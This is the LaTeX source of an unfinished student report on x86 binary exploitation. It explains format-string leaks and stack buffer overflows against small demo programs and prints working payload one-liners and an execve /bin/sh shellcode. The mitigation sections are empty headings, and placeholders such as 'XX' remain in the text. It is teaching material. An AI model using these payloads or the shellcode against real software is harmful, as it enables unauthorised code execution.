% vim:set spell tw=79:

\documentclass[article]{uibk}
\title{Exploitation Techniques and Mitigations}
\author{Alex Hirsch \and Patrick Ober}
\date{2016-01-31}

\newminted{nasm}{fontsize=\scriptsize,frame=leftline,framesep=2mm,linenos}

\begin{document}

% \maketitle
%
% \section*{Abstract}
% \label{sec:abstract}
%
% \setcounter{tocdepth}{1}
% \tableofcontents
%
% \newpage

\section*{Acknowledgement}

A university course at Rensselaer Polytechnic
Institut\footnote{\url{http://rpi.edu/}} held in Spring 2015 focused on
\textit{Modern Binary Exploitation}. They made their course material available
on GitHub \cite{RPISEC} under the Creative Commons Attribution-NonCommercial
4.0 International
license\footnote{\url{https://creativecommons.org/licenses/by-nc/4.0/legalcode}}.
We reused a lot of their material in this project.

We highly recommend checking them out and having a look at their material for
further details.

\section{Introduction}

Exploiting binaries was comparatively easy in the early days of computing.
Usually there were no special mitigation techniques in place trying to prevent
even the most simplest exploits. This is the point in time where we will start
of. First we talk about two very simple exploits, namely the Format String
Exploit and the Buffer Overflow in combination with Shell Code. Note that there
is a huge collection of exploitation techniques known to the public and we will
thereby only look at a very small fraction of them.

But before we can introduce these two exploits, some background knowledge is
required. This will be handled by the next section, which provides a short
overview of the relevant components in our target architecture, the x86
platform.

After that both techniques are introduced to the reader, followed by the first
mitigation technique, Data Execution Prevention (DEP). From there on we will
keep on using the buffer overflow technique with some adaptations to circumvent
DEP. At this point Return Oriented Programming (ROP) is introduced.

This directly leads to Address Space Layout Randomization (ASLR) the next
mitigation mechanism we will discuss. Again the buffer overflow technique can
be adapted to break ASLR through the use of additional information.

Since neither DEP nor ASLR provide significant protection against even this
simple technique, an additional mitigation is put into place in the form of
Stack Cookies.

Examples will be provided along the way to support the reader and provide some
additional explanation.

Control Flow Integrity (CFI), Heap Corruption and polymorphic code will follow
in a more compressed manner to communicate the main idea behind each of them.

Finally we will conclude with a word about other architectures (x86\_64 and
ARM) and a lookout that even languages considered secure have their own set of
exploitation techniques an attacker could leverage.

\subsection{Main Assumption}

Throughout this work we assume that we know the target binary (and the
libraries it uses). Let us show that this assumption is quite reasonable to
make by looking through the eyes of the adversary. An attacker who wants to
penetrate a target machine and get control over it would most likely choose the
easiest path, by exploiting the weakest link. Most machines relevant to an
attackers interest will run provide multiple services. For example, while the
main server of a small business company may run a homemade communication server
for interaction between them and their clients, it may also run a standard web
server. Sending a misspelled request to the server may lead following response:

\begin{pre*}{autogobble,xleftmargin=1cm}
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>400 Bad Request</title>
    </head><body>
    <h1>Bad Request</h1>
    <p>Your browser sent a request that this server could not understand.<br />
    </p>
    <hr>
    <address>Apache/2.2.22 (Ubuntu) Server at ovinnik.canonical.com Port 80</address>
    </body></html>
    Connection closed by foreign host.
\end{pre*}

The web server tells us his exact version and since it also provides
information about the operating system an attacker can easily copy the basic
setup to test and tweak his exploits.

\section{Platform x86}

This section will teach necessary background knowledge about the target
platform to fully conceive the following techniques. But first let us elaborate
why x86 has been chosen in the first place.

At the time these techniques (and the related mitigations) were established,
x86 was the most common platform. Since most exploits easily translate over
from x86 to other architectures, especially x86\_64 which very common nowadays.
Also, most material found on the internet regarding this and related topics
cover x86.

More detailed explanations can be found on
Wikipedia\footnote{\url{https://en.wikipedia.org/wiki/X86}} or the Intel
Manual\footnote{\url{https://www-ssl.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html}}.

\subsection{CPU and registers}

\begin{figure}[htpb]
    \centering
    \includegraphics[width=\textwidth]{gfx/x86_registers.pdf}
    \caption{Register overview including \SI{64}{\bit} extension}
    \label{fig:registers}
\end{figure}

\Cref{fig:registers} (from
Wikipedia\footnote{\url{https://en.wikipedia.org/w/index.php?title=X86&oldid=696308590\#/media/File:Table_of_x86_Registers_svg.svg}})
shows an overview of registers available on the x86 platform. While there are
dedicated registers for floating pointer operations and also special registers
which hardware protection (segment registers) we will only focus on nine most
commonly used registers.

\begin{minipage}[t]{0.5\textwidth}
    \begin{description}
        \item[\texttt{EAX}] Accumulator Register
        \item[\texttt{EBX}] Base Register
        \item[\texttt{ECX}] Counter Register
        \item[\texttt{EDX}] Data Register
        \item[\texttt{ESI}] Source Index
        \item[\texttt{EDI}] Destination Index
        \item[\texttt{EBP}] Base Pointer
        \item[\texttt{ESP}] Stack Pointer
        \item[\texttt{EIP}] Instruction Pointer
    \end{description}
\end{minipage}
\begin{minipage}[t]{0.45\textwidth}
    \begin{figure}[H]
        \includegraphics[width=\textwidth]{gfx/single_register.png}
        \caption{Addressing specific parts of a register including \SI{64}{\bit} extension}
        \label{fig:single_register}
    \end{figure}
\end{minipage}
\bigskip

The instruction pointer \texttt{EIP} points to the next instruction located in
memory which is going to be executed on the cycle. Stack pointer \texttt{ESP} and base
pointer \texttt{EBP} are used for stack management which is vital to call and
return from multiple functions properly. The remaining six registers are used
for computation and passing arguments for system calls. Their values can either
be interpreted as integers or pointers.

Note that these registers can be addressed partially allowing one to write only
to the lower \SI{16}{bit} for example as displayed in
\cref{fig:single_register} taken from \textit{null
programm}\footnote{\url{http://nullprogram.com/img/x86/register.png} on
December of 2015}.

The CPU comes with protection mechanisms which allows the operating system
kernel to limit the privileges of other processes. This mechanism is known as
\textit{protection rings} (Ring 0 -- Ring 3). The kernel runs \emph{in} Ring 0
(most privileged) and switches to Ring 3 (least privileged) when a normal
process is scheduled. A system call has to be made by the process if it needs
something which goes beyond its scope. The kernel takes over, deals with the
request and returns execution back to the process. This is known as
\textit{context switch} and switching between Rings happens along the way.

\subsection{System Calls}

As already mentioned in the previous paragraph, a process only has limited
capabilities and the kernel has to take over to fulfill certain (more
privileged) operations. The operating system's documentation tells you which
system calls are available (on which platform) and what additional parameters
they require. Let us illustrate this with an example: On x86 the Linux system
number 4 (starting from 0) is the \texttt{sys\_write} system call which writes
data to a file descriptor. It takes three arguments, the file descriptor to
write to, a pointer to the start of the data which should be written and the
length of the data. The number of the system call together with these three
parameters are placed in the \texttt{EAX}, \texttt{EBX}, \texttt{ECX},
\texttt{EDX} respectively. To invoke the system call issue following
instruction:

\begin{nasmcode*}{autogobble,xleftmargin=1cm,linenos=false}
    int     0x80
\end{nasmcode*}

Nowadays you may encounter a different mechanism for system calls, the Virtual
Dynamic Shared Objects (vDSO) mechanism. This goes beyond our scope here, we
will use the previously mentioned mechanism in our exploits. If interested, you
may want to look at the related man
page\footnote{\url{http://man7.org/linux/man-pages/man7/vdso.7.html}}.

\subsection{Memory}

Physical memory is managed by the operation system kernel by utilising the
Memory Management Unit (MMU). Each process' address space is virtualized and
memory operations are translated on-the-fly by the MMU. The physical memory is
segmented into \textit{pages} (typically \SI{4}{\kibi\byte} in size) and each
page can be mapped into the virtual address space of one or more (shared)
processes.~\cite[pp.~400]{unix_interals}

The main parts located inside the (virtual) address space of a process are the
executable itself with its \texttt{.text} and \texttt{.data} section, the heap
used for dynamic data, the stack used for local variables and function calling
and used libraries.

\subsection{Endianness}
\label{sub:endianness}

\begin{figure}[t]
    \centering
    \includegraphics[width=0.35\textwidth]{gfx/little_endian.pdf}
    \caption{Placement of bytes in memory in little-endian}
    \label{fig:little_endian}
\end{figure}

Endianness refers to the byte order used when storing data in memory (or
transmitting it over the network). \Cref{fig:little_endian} (from
Wikipedia\footnote{\url{https://en.wikipedia.org/w/index.php?title=Endianness&oldid=696417697\#/media/File:Little-Endian.svg}})
illustrates that the least significant byte of a word is placed at the lower
memory address and successive bytes are placed as the memory address increases.

\subsection{Calling Convention}
\label{sub:calling_convention}

A calling convention defines how function calls should be implemented. What
calling convention is used depends on the platform, toolchain and (compiler)
settings. Let us exhibit what the convention defines and what convention we are
using.

\begin{minipage}[t]{0.47\textwidth}
    Defines:
    \begin{itemize}
        \item Where to place arguments
        \item Where to place return value
        \item Where to place return address
        \item Who prepares the stack
        \item Who saves which register
        \item Who cleans up\\
            (caller or callee)
    \end{itemize}
\end{minipage}
\begin{minipage}[t]{0.47\textwidth}
    C Declaration (cdecl):
    \begin{itemize}
        \item Arguments on stack (reverse order)\\
            stack aligned to \SI{16}{\byte} boundary
        \item Return via register (\texttt{EAX} / \texttt{ST0})
        \item \texttt{EAX}, \texttt{ECX}, \texttt{EDX} saved by the caller\\
            rest saved by the callee
        \item On stack:\\
            old instruction pointer (\texttt{IP})\\
            old base pointer (\texttt{BP})
        \item Caller does the cleanup
    \end{itemize}
\end{minipage}

\section{Format String Exploits}

The first exploitation technique we will discuss builds upon the interpretation
of format strings. \texttt{printf} is a C function of the standard library
which will interpret such strings and print them to \texttt{stdout}. As the
name already tells you, the supplied string contains \textit{formatter}
describing how to actually handle additional arguments. If you are unfamiliar
with \texttt{printf} please have a look at the man
page\footnote{\url{http://linux.die.net/man/3/printf}}.

Taking a closer look at \texttt{printf} we can see that its first argument is a
format string followed by a variable number of additional arguments. In C you
don't know how many arguments have been supplied when a function with a
variable number of arguments is called. Some instances work around this by
taking an argument count as their first argument, others expect you to
terminate with a special symbol (usually \texttt{NULL}). \texttt{printf} uses
the format string to derive how many arguments have been supplied. Calling
\texttt{printf}, for example, with the string \texttt{"\%d + \%d = \%d"}
assumes that (at least) three arguments have been provided.

\begin{listing}[h!]
    \begin{minipage}[t]{0.47\textwidth}
        \cfile{../format_string/main.c}
    \end{minipage}
    \begin{minipage}[t]{0.47\textwidth}
        \begin{pre*}{autogobble}
            > echo foobar | ./main
            You entered:
            foobar
        \end{pre*}
        \medskip
        \begin{pre*}{autogobble}
            > echo AAAABBBB | ./main
            correct
        \end{pre*}
        \medskip
        \begin{pre*} {autogobble}
            > echo '%08x' | ./main
            You entered:
            bfd98ed4
        \end{pre*}
    \end{minipage}
    \caption{Program vulnerable to Format String Exploits}
    \label{src:format_string_exploit}
\end{listing}

The exploit comes from the notion that a format string provided by an attacker
gets interpreted. The program shown in \cref{src:format_string_exploit} will
take an arbitrary string from \texttt{stdin} and pass it on to \texttt{printf}.
For simple inputs (not containing formatter) this works fine. But as soon as
formatter are provided, \texttt{printf} is going to access the locations where
the corresponding arguments \emph{would} be located. From the calling
convention described in \cref{sub:calling_convention} we know that these
arguments would be located on the stack, therefore \texttt{printf} will print
whatever lies on the stack.

To fully exploit the provided example, note that an attacker in this scenario
wants to get a hold of the hardcoded password stored in \texttt{passwd}. Since
local variables are placed on the stack \texttt{printf} will be able to read
the password if enough formatters are provided:

\begin{pre*} {autogobble}
    > python -c 'print "%08x." * 10' | ./main
    bf920c14.00000064.b77de29e.00000000.00000000.b77fedf8.bf920d94.00000000.41414141.42424242.
\end{pre*}

Here we use Python to craft the format string for us. As we can see the
password is printed (ASCII encoded). Byte order is swapped because of
endianness (see \cref{sub:endianness}). Apart from the password we also gather
a bunch of pointers, these can be used later on to break ASLR (see
\cref{sub:info_leak}).

We would like to point the reader to the book \textit{Hacking: The Art of
Exploitation} \cite[pp.~167]{art_of_exploitation} for more details about this
technique. We will come back to this technique later on to show that
\texttt{printf} enables even more sophisticated attacks.

\section{Buffer Overflow}

The second type of exploits we'll look at is known as Buffer Overflows and as
on may already derive from the name, this is about submitting more data to a
buffer than it was originally designed for. This setup can be exploited when
bound checking is done wrong or not at all. An attacker is therefore able to
overwrite data (or instructions) next to the buffer's location.

The consequences of an exploited buffer overflow depend on where the buffer is
located. The most interesting location would of course be the stack because,
apart from local variables and arguments, it holds the return address of a
function. But buffers located inside the heap or static may also be viable
options. Common terms related to these scenarios are \textit{stack smashing}
and \textit{heap corruption}. We will talk about heap corruption later on when
breaking ASLR, for now we focus our attention on stack smashing.

\begin{figure}[H]
    \centering
    \includegraphics[width=0.4\textwidth]{gfx/stack_smash.png}
    \caption{Stack frame containing a buffer}
    \label{fig:stack_frame}
\end{figure}

Lets start of by examining the stack holding a buffer as local variable, see
\cref{fig:stack_frame}. Right now the buffer contains the string
\texttt{"hello"} followed by a terminator. Since the buffer has been allocated
to hold a maximum of \SI{12}{\byte} this fits. If data is written to the buffer
larger than \SI{12}{\byte} the following variable (or parameter) \texttt{bar}
will be overwritten, followed by the saved frame pointer and the return
address. If even more data is supplied the following stack frame will be
overwritten in the same manner.

If an attacker can provide the data written to the buffer and no (or wrong)
bound checking is done, he can therefore inject arbitrary (malicious) into the
stack frame. This could be, for instance, be used to overwrite a flag
indication whether an authentication has been performed successfully or not.
But since this is pretty forward lets go beyond that and see what happens when
changing the return address.

\begin{listing}[h!]
    \cfile{../overflow/overflow.c}
    \caption{Program vulnerable to buffer overflows}
    \label{src:buffer_overflow}
\end{listing}

As shown in \cref{src:buffer_overflow} we have a buffer suited for
\SI{20}{\byte} but without any bound checking. If the provided input is longer,
we will be able to overwrite the return address. Lets have a look at the
resulting binary utilizing \texttt{objdump}.

\begin{pre}
0804849b <mordor>:
 804849b:   55                      push   %ebp
 804849c:   89 e5                   mov    %esp,%ebp
 804849e:   83 ec 08                sub    $0x8,%esp
 80484a1:   83 ec 0c                sub    $0xc,%esp
 80484a4:   68 c0 85 04 08          push   $0x80485c0
 80484a9:   e8 b2 fe ff ff          call   8048360 <puts@plt>
 80484ae:   83 c4 10                add    $0x10,%esp
 80484b1:   90                      nop
 80484b2:   c9                      leave
 80484b3:   c3                      ret

080484b4 <echo>:
 80484b4:   55                      push   %ebp
 80484b5:   89 e5                   mov    %esp,%ebp
 80484b7:   83 ec 28                sub    $0x28,%esp
 80484ba:   c7 45 e4 00 00 00 00    movl   $0x0,-0x1c(%ebp)
 80484c1:   c7 45 e8 00 00 00 00    movl   $0x0,-0x18(%ebp)
 80484c8:   c7 45 ec 00 00 00 00    movl   $0x0,-0x14(%ebp)
 80484cf:   c7 45 f0 00 00 00 00    movl   $0x0,-0x10(%ebp)
 80484d6:   c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%ebp)
 80484dd:   83 ec 0c                sub    $0xc,%esp
 80484e0:   68 e8 85 04 08          push   $0x80485e8
 80484e5:   e8 76 fe ff ff          call   8048360 <puts@plt>
 80484ea:   83 c4 10                add    $0x10,%esp
 80484ed:   83 ec 08                sub    $0x8,%esp
 80484f0:   8d 45 e4                lea    -0x1c(%ebp),%eax
 80484f3:   50                      push   %eax
 80484f4:   68 f4 85 04 08          push   $0x80485f4
 80484f9:   e8 92 fe ff ff          call   8048390 <__isoc99_scanf@plt>
 80484fe:   83 c4 10                add    $0x10,%esp
 8048501:   83 ec 08                sub    $0x8,%esp
 8048504:   8d 45 e4                lea    -0x1c(%ebp),%eax
 8048507:   50                      push   %eax
 8048508:   68 f7 85 04 08          push   $0x80485f7
 804850d:   e8 3e fe ff ff          call   8048350 <printf@plt>
 8048512:   83 c4 10                add    $0x10,%esp
 8048515:   90                      nop
 8048516:   c9                      leave
 8048517:   c3                      ret
\end{pre}

Looking at lines XX, XX and XX we can infer that the buffer will start
\SI{28}{\byte} (\texttt{0x1c}) before the base pointer. Hence we have to supply
\SI{32}{\byte} (28 + 4) of arbitrary data followed by the address where we want
to jump to. Lets jump into the function \texttt{mordor} located at
\texttt{0x804849b}, keep in mind that the byte order needs to be swapped.

\begin{pre}
> python -c "print 'A'*32 + '\x9b\x84\x04\x08'" | ./overflow
Enter text:
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
One does not simply jump into mordor()!
Segmentation fault (core dumped)
\end{pre}

And the function \texttt{mordor} has been executed, despite the segmentation
fault one can see that return address has been overwritten successfully.

\section{Shell Code}

While this is neat and can certainly be useful to an adversary, stack smashing
also enables us to inject arbitrary code into a program. Contrary to the
previous section the target machine will execute code provided by the attacker.
This can be achieved by bending the return address into the buffer used for the
exploit. Provided instructions will be executed upon return. Shell code is a
piece of (binary) code which opens up a shell that reads and executes commands
from an attacker. Lets start this section by crafting some shell code.

\begin{nasmcode*}{autogobble,xleftmargin=1em}
    xor     eax, eax    ;Clearing eax register
    push    eax         ;Pushing NULL bytes
    push    0x68732f2f  ;Pushing //sh
    push    0x6e69622f  ;Pushing /bin
    mov     ebx, esp    ;ebx now has address of /bin//sh
    push    eax         ;Pushing NULL byte
    mov     edx, esp    ;edx now has address of NULL byte
    push    ebx         ;Pushing address of /bin//sh
    mov     ecx, esp    ;ecx now has address of address
                        ;of /bin//sh byte
    mov     al, 11      ;syscall number of execve is 11
    int     0x80        ;Make the system call
\end{nasmcode*}

This piece of assembly sets up the parameters for the \texttt{execve} system
call and than invokes to replace the currently running process with a shell.
\texttt{execve} takes three arugments, a string of the program to execute (here
\texttt{"/bin//sh"} + terminator), a list of arguments for that program and a
list of environment variables. Its system call number is 11 and it will accept
\texttt{NULL} for both lists. The double slash in the first argument is used to
prevent null bytes inside the shell code. The function which reads the shell
code may truncate it upon reading a null byte, therefore we have to work around
this without chaning the underlying semantics.

Running this code through an assembler yields binary code which can be placed
in the buffer. Finding the starting location of our buffer will be a little bit
more complicated, we cannot read it directly from the binary of the target
program so we'll examine it in a debugger.

Now we know that the buffer will be located at XXXXXXXX at runtime, but since
we got this address while running the program in a debugger it may be offset a
few bytes when run without debugger. This happens because environment variables
and meta information, like the program name, determin the stack starting
position (they are placed right after the stack). Hence we may not directly hit
the first instruction of our shell code right away, but since the buffer is
bigger than the actual payload we can improve our odds by prefixing the shell
code with \texttt{NOP} instructions. As long as the return address points
somewhere into this sequence of \texttt{NOP}s the CPU will \emph{slide} to the
next instruction. Therefore this is known as a \textit{\texttt{NOP} Sled}. We
append some arbitrary data to the shell code as offset to overwrite the return
address.

\begin{figure}[H]
    \centering
    \input{gfx/shellcode.tikz}
    \caption{Putting the payload together}
    \label{fig:shell_code}
\end{figure}

\newpage

\section{Data Execution Prevention (DEP)}

\section{Return Oriented Programming (ROP)}

\section{Address Space Layout Randomization (ASLR)}

\section{Stack Cookies}

\section{Control Flow Integrity (CFI)}

\section{Other Architectures}

\section{Conclusion}

\bibliography{references}

\end{document}
